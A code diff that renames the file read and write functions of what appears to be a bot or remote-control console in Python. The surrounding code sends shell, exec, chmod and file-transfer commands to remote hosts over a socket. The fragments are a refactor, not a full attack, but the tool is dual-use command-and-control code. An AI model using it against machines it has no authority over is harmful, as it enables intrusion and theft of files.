@@ -275,8 +275,8 @@ CMD_SYSTEM_FORK         = BASE_CMD_SYSTEM + 1
 CMD_SYSTEM_SHELL        = BASE_CMD_SYSTEM + 2
 
 # File I/O commands.
-CMD_FILE_READ           = BASE_CMD_FILE + 0
-CMD_FILE_WRITE          = BASE_CMD_FILE + 1
+CMD_FILE_PULL           = BASE_CMD_FILE + 0     # formerly CMD_FILE_READ
+CMD_FILE_PUSH           = BASE_CMD_FILE + 1     # formerly CMD_FILE_WRITE
 CMD_FILE_DELETE         = BASE_CMD_FILE + 2
 CMD_FILE_EXEC           = BASE_CMD_FILE + 3
 CMD_FILE_CHMOD          = BASE_CMD_FILE + 4
@@ -738,19 +738,19 @@ class Bot(object):
         return self.sock
 
     @bot_action
-    def file_read(self, remote_file, local_file):
-        self.sock.sendall( build_command(CMD_FILE_READ, remote_file) )
+    def file_pull(self, remote_file, local_file):
+        self.sock.sendall( build_command(CMD_FILE_PULL, remote_file) )
         data_len = get_resp_header(self.sock)
         with open(local_file, "wb") as fd:
             copy_stream(self.sock.makefile(), fd, data_len)
 
     @bot_action
-    def file_write(self, local_file, remote_file):
+    def file_push(self, local_file, remote_file):
         with open(local_file, "rb") as fd:
             fd.seek(0, 2)
             file_size = fd.tell()
             fd.seek(0, 0)
-            self.sock.sendall( build_command(CMD_FILE_WRITE, remote_file, file_size) )
+            self.sock.sendall( build_command(CMD_FILE_PUSH, remote_file, file_size) )
             copy_stream(fd, self.sock.makefile(), file_size)
         get_resp_no_data(self.sock)
 
@@ -1735,7 +1735,7 @@ class Console(Cmd):
             return
 
         # Perform the operation.
-        self.current.file_read(remote_file, local_file)
+        self.current.file_pull(remote_file, local_file)
         print("Downloaded file: %s" % local_file)
 
     def do_push(self, line):
@@ -1768,7 +1768,7 @@ class Console(Cmd):
             return
 
         # Perform the operation.
-        self.current.file_write(local_file, remote_file)
+        self.current.file_push(local_file, remote_file)
         print("Uploaded file: %s" % remote_file)
 
     def do_chmod(self, line):
